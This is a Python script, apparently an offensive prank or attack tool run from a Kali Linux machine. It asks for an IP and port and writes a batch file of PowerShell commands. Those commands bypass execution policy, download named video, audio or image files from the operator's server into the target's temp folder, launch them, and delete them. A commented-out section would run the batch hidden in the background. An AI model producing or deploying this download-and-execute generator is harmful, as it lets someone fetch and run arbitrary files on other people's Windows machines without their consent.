import os
from time import sleep
from pathlib import Path
import subprocess

AZUL = "\033[94m"
VERDE = "\033[92m"
VERMELHO = "\033[91m"
AMARELO = "\033[38;5;226m"
RESET = "\033[0m"

banner = r"""
|------------------------------------------------------|
|  ____                 _                     _        |
| |  _ \ ___  _ __ ___ | |__   ___   ___ ___ | |_ ___  |
| | |_) / _ \| '_ ` _ \| '_ \ / _ \ / __/ _ \| __/ _ \ |
| |  __/ (_) | | | | | | |_) | (_) | (_| (_) | || (_) ||
| |_|   \___/|_| |_| |_|_.__/ \___/ \___\___/ \__\___/ |
|------------------------------------------------------|
"""

banner_gui = r"""
|---------------------|
|    ________  ______ |
|   / ____/ / / /  _/ |
|  / / __/ / / // /   |
| / /_/ / /_/ // /    |
| \____/\____/___/    |
|---------------------|
 """                  

banner_lines = [line.rstrip() for line in banner.strip().split('\n') if line.strip()]
banner_gui_lines = [line.rstrip() for line in banner_gui.strip().split('\n') if line.strip()]

max_banner_width = max(len(line) for line in banner_lines)
max_gui_width = max(len(line) for line in banner_gui_lines)

combined_lines = []
for i in range(max(len(banner_lines), len(banner_gui_lines))):
    h = banner_lines[i] if i < len(banner_lines) else ''
    w = banner_gui_lines[i] if i < len(banner_gui_lines) else ''

    h_colored = f"{AMARELO}{h.ljust(max_banner_width)}{RESET}"
    
    w_colored = f"{VERMELHO}{w.ljust(max_gui_width)}{RESET}"

    combined_lines.append(h_colored + "" + w_colored)

print('\n'.join(combined_lines))


ip = input(f"{AMARELO}IP): {RESET}").strip()
porta = input(f"{AMARELO}Porta): {RESET}").strip()
print(f"{AZUL}Verificando...{RESET}")
sleep(1.5)

try:
    porta_int = int(porta)
    if not (1 <= porta_int <= 65535):
        raise ValueError
except ValueError:
    print(f"{VERMELHO}Porta inválida D:{RESET}")
    raise SystemExit(1)

os.system('cls' if os.name == 'nt' else 'clear')

print(f"{VERMELHO}Você decide:{RESET}")
print(f"{AMARELO}1 -VIDEO{RESET}")
print(f"{AMARELO}2 -AUDIO{RESET}")
print(f"{AMARELO}3 -IMAGEM{RESET}")
escolha = input(f"{AZUL}Escolha: {RESET}").strip()

while escolha not in ("1", "2", "3"):
    print(f"{VERMELHO}inválido.{RESET}")
    escolha = input(f"{AZUL}Escolha.{RESET}").strip()

if escolha == "1":
    tipo = "video"
    arquivos = input(f"{AMARELO}Nome dos vídeos (separe por vírgula ex video.mp4, video1.mp4): {RESET}").strip()
elif escolha == "2":
    tipo = "audio"
    arquivos = input(f"{AMARELO}Nome dos audios (separe por vírgula ex audio1.mp3, audio2.mp3): {RESET}").strip()
else:  # escolha == "3"
    tipo = "iamgem"
    arquivos = input(f"{AMARELO}Nome das imagems (separe por vírgula ex imagem1.jpg, imagem2.png): {RESET}").strip()

lista_arquivos = [a.strip() for a in arquivos.split(",") if a.strip()]
if not lista_arquivos:
    print(f"{VERMELHO}informa um arquivo né ze{RESET}")
    raise SystemExit(1)

print(f"{VERDE}\nCerto, {tipo.upper()} -> {', '.join(lista_arquivos)}{RESET}")
print(f"{AZUL}conectando em {ip}:{porta_int}..(não se esqueça de ter ligado o servidor!)2\n{RESET}")
sleep(8)

comandos = []
for nome_arquivo in lista_arquivos:
    comando = f'''powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try {{ $url = 'http://{ip}:{porta_int}/{nome_arquivo}'; $path = \\"$env:TEMP\\{nome_arquivo}\\"; Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop; Start-Process $path; Start-Sleep -Seconds 7.5; Remove-Item $path -Force -ErrorAction SilentlyContinue }} catch {{ exit 1 }}"
if %ERRORLEVEL% neq 0 echo Erro ao baixar/abrir {nome_arquivo} & pause
echo.
'''
    comandos.append(comando)

comando_final = "\n".join(comandos)

out_path = Path(r"/home/kali/comandos.txt") #AQUI ONDE VOCÊ COLOCA O CAMINHO ONDE VAI SALVAR!!!!!!

with out_path.open("w", encoding="utf-8", newline="\r\n") as f:
    f.write(comando_final)

print(f"{VERDE}salvo em: {out_path}{RESET}")
print(f"{VERDE}tipo:{tipo.upper()} ({len(lista_arquivos)} arquivo(s)){RESET}")
print(f"{VERDE}conectando em {ip}:{porta_int}...\n{RESET}")

#print(f"{AZUL}executando bat...{RESET}")
#try:
#    subprocess.Popen(
#        ['cmd', '/c', str(out_path)] if os.name == 'nt' else ['bash', str(out_path)],
#        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
#    )
#    print(f"{VERDE}Executado! :D(em segundo plano){RESET}")
#except Exception as e:
#    print(f"{VERMELHO}erro ao executar o bat D: {e}{RESET}")

print(f"{VERDE}\nSUCESSO! Arquivo salvo como: comandos.txt{RESET}")


